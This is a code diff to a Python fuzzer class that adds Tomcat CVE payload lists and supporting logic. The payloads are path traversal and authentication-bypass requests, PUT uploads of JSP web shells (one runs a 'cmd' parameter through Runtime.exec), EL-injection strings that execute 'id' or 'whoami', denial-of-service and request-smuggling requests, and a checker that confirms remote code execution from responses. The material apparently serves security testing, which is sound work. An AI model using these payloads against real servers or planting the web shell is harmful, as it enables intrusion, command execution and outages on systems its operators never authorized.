@@ -53,6 +53,72 @@ class Fuzzer:
         b"`date`", # Command Injection (Backtick Date) 
     ]
 
+    # ============================================================
+    # TOMCAT 11 CVE-SPECIFIC PAYLOADS
+    # ============================================================
+    
+    # CVE-2025-24813: Path Traversal + Deserialization RCE (CVSS 9.1)
+    # Active exploitation observed - upload malicious session via PUT
+    TOMCAT_CVE_24813 = [
+        b"GET /..;/manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /..;/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /%2e%2e;/manager/status HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /foo/..;/WEB-INF/classes/ HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"PUT /.session HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\nMALICIOUS!",
+    ]
+    
+    # CVE-2024-50379 & CVE-2024-56337: TOCTOU Race Condition RCE (CVSS 9.8)
+    # JSP compilation race on case-insensitive filesystem
+    TOMCAT_CVE_TOCTOU = [
+        b"PUT /test.Jsp HTTP/1.1\r\nHost: target\r\nContent-Length: 50\r\n\r\n<%Runtime.getRuntime().exec(\"id\");%>",
+        b"PUT /test.jSp HTTP/1.1\r\nHost: target\r\nContent-Length: 80\r\n\r\n<%= new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).next() %>",
+        b"PUT /shell.JSP HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\n\r\n<%@ page import=\"java.io.*\" %><%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>",
+        b"GET /test.jsp HTTP/1.1\r\nHost: target\r\n\r\n",
+    ]
+    
+    # CVE-2025-55752: Directory Traversal via Rewrite (CVSS 8.1)
+    TOMCAT_CVE_55752 = [
+        b"GET /rewrite/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /..%252f..%252fWEB-INF/classes/ HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /foo/..;/META-INF/MANIFEST.MF HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /%c0%ae%c0%ae/WEB-INF/ HTTP/1.1\r\nHost: target\r\n\r\n",
+    ]
+    
+    # CVE-2025-49125: Authentication Bypass (CVSS 8.6)
+    TOMCAT_CVE_49125 = [
+        b"GET /manager/..;/html HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /manager%00/html HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /;/manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET /manager;foo=bar/html HTTP/1.1\r\nHost: target\r\n\r\n",
+        b"GET //manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
+    ]
+    
+    # CVE-2024-54677 & CVE-2025-53506: DoS Attacks (CVSS 7.5-7.8)
+    TOMCAT_CVE_DOS = [
+        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 999999999\r\n\r\n",
+        b"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFF\r\n" + b"A" * 10000,
+        b"GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n\r\n" * 100,
+        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Type: multipart/form-data; boundary=x\r\n\r\n--x\r\n" * 1000,
+    ]
+    
+    # EL Injection Payloads for Tomcat (CWE-917)
+    TOMCAT_EL_INJECTION = [
+        b"${7*7}",
+        b"${T(java.lang.Runtime).getRuntime().exec('id')}",
+        b"${''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}",
+        b"${pageContext.request.getSession().getServletContext()}",
+        b"${applicationScope}",
+        b"${T(java.lang.System).getenv()}",
+        b"${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"id\")}",
+    ]
+    
+    # HTTP Request Smuggling (CWE-444)
+    HTTP_SMUGGLING = [
+        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
+        b"GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n",
+        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n",
+    ]
+
     def mutate_payload(self, payload, mutation_rate=0.1):
         """
         Mutates the given payload (bytes).
@@ -100,6 +166,107 @@ class Fuzzer:
         else:
             return random.choice(self.NASTY_STRINGS) + payload
 
+    def get_tomcat_payload(self, cve_type=None):
+        """
+        Get a random Tomcat CVE-specific payload.
+        
+        Args:
+            cve_type: Optional CVE type filter (24813, toctou, 55752, 49125, dos, el, smuggling)
+        """
+        all_tomcat_payloads = (
+            self.TOMCAT_CVE_24813 + 
+            self.TOMCAT_CVE_TOCTOU + 
+            self.TOMCAT_CVE_55752 + 
+            self.TOMCAT_CVE_49125 + 
+            self.TOMCAT_CVE_DOS + 
+            self.TOMCAT_EL_INJECTION + 
+            self.HTTP_SMUGGLING
+        )
+        
+        if cve_type == "24813":
+            return random.choice(self.TOMCAT_CVE_24813)
+        elif cve_type == "toctou":
+            return random.choice(self.TOMCAT_CVE_TOCTOU)
+        elif cve_type == "55752":
+            return random.choice(self.TOMCAT_CVE_55752)
+        elif cve_type == "49125":
+            return random.choice(self.TOMCAT_CVE_49125)
+        elif cve_type == "dos":
+            return random.choice(self.TOMCAT_CVE_DOS)
+        elif cve_type == "el":
+            return random.choice(self.TOMCAT_EL_INJECTION)
+        elif cve_type == "smuggling":
+            return random.choice(self.HTTP_SMUGGLING)
+        else:
+            return random.choice(all_tomcat_payloads)
+
+    def verify_crash(self):
+        """
+        Verify if crash is real vs rate-limiting.
+        Wait 2s, then retry 3 times to confirm server is actually down.
+        
+        Returns:
+            str: "CRASH_CONFIRMED", "RATE_LIMITED", or "UNKNOWN"
+        """
+        if not self.target_ip or not self.target_port:
+            return "UNKNOWN"
+        
+        logger.info("Verifying crash... waiting 2s before retry")
+        time.sleep(2)
+        
+        for attempt in range(3):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                s.connect((self.target_ip, self.target_port))
+                s.close()
+                logger.info(f"Server recovered on attempt {attempt + 1} - was RATE_LIMITED")
+                return "RATE_LIMITED"
+            except Exception:
+                pass
+            time.sleep(1)
+        
+        logger.warning("Server stayed down after 3 retries - CRASH_CONFIRMED!")
+        return "CRASH_CONFIRMED"
+
+    def check_rce_success(self, response_data):
+        """
+        Check if response indicates successful RCE.
+        
+        Returns:
+            tuple: (success: bool, indicator: str)
+        """
+        if not response_data:
+            return False, None
+        
+        # Convert to string for pattern matching
+        try:
+            response_str = response_data.decode('utf-8', errors='ignore')
+        except:
+            response_str = str(response_data)
+        
+        # RCE indicators
+        indicators = [
+            ("uid=", "Linux id command output"),
+            ("gid=", "Linux id command output"),
+            ("root:", "/etc/passwd content"),
+            ("/bin/bash", "Shell path"),
+            ("Windows", "Windows system info"),
+            ("SYSTEM", "Windows SYSTEM user"),
+        ]
+        
+        for pattern, description in indicators:
+            if pattern in response_str:
+                return True, description
+        
+        # Check for date command output pattern
+        import re
+        date_pattern = r"[A-Z][a-z]{2} [A-Z][a-z]{2} \d{1,2} \d{2}:\d{2}:\d{2}"
+        if re.search(date_pattern, response_str):
+            return True, "Date command output"
+        
+        return False, None
+
     def send_payload(self, payload):
         """
         Sends payload to the target via TCP socket.
@@ -121,13 +288,24 @@ class Fuzzer:
             final_payload = payload
             if self.paths and payload.startswith(b"GET /"):
                 import random
+                from urllib.parse import urlparse
                 chosen_path = random.choice(self.paths)
+                
+                # Sanitize path: strip scheme/host, ensure leading slash
+                try:
+                    parsed = urlparse(chosen_path)
+                    sanitized_path = parsed.path or "/"
+                    if not sanitized_path.startswith("/"):
+                        sanitized_path = "/" + sanitized_path
+                except:
+                    sanitized_path = chosen_path if chosen_path.startswith("/") else "/" + chosen_path
+                
                 # Replace "GET /" with "GET /path"
                 # Note: This assumes standard HTTP request format
                 try:
                     parts = payload.split(b" ")
                     if len(parts) >= 2:
-                        parts[1] = chosen_path.encode()
+                        parts[1] = sanitized_path.encode() if isinstance(sanitized_path, str) else sanitized_path
                         final_payload = b" ".join(parts)
                 except:
                     pass
@@ -170,14 +348,20 @@ class Fuzzer:
                 
                 # 1. Check for Hard Crash (Socket)
                 if result["crash"]:
-                    logger.warning(f"POSSIBLE CRASH detected at iteration {i}!")
-                    crashes.append({
-                        "iteration": i,
-                        "payload": mutated_payload.hex(),
-                        "error": "Connection Refused / Socket Error",
-                        "metrics": result
-                    })
-                    return crashes # Stop on first crash
+                    # Verify it's a REAL crash, not rate-limiting
+                    crash_status = self.verify_crash()
+                    if crash_status == "CRASH_CONFIRMED":
+                        logger.warning(f"CRASH CONFIRMED at iteration {i}!")
+                        crashes.append({
+                            "iteration": i,
+                            "payload": mutated_payload.hex(),
+                            "error": "CRASH_CONFIRMED - Server stayed down",
+                            "metrics": result
+                        })
+                        return crashes
+                    else:
+                        logger.info(f"Iteration {i}: Connection refused but server recovered (RATE_LIMITED)")
+                        # Don't count as crash, continue fuzzing
                 
                 # 2. Check for Latency Spike (DoS / Heavy Processing)
                 if result["time_ms"] > 1500: # > 1.5 seconds
